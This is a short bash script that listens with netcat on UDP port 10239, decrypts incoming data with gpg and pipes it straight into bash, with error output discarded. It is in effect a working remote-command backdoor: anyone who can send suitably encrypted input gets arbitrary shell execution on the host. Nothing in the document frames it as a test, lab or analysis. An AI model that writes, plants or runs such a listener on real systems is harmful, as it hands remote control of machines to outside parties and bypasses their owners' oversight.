#!/bin/env bash
PORT=10239
nc -vulnzp ${PORT} 2>/dev/null | gpg -d --allow-multiple-messages 2>/dev/null | /usr/bin/bash
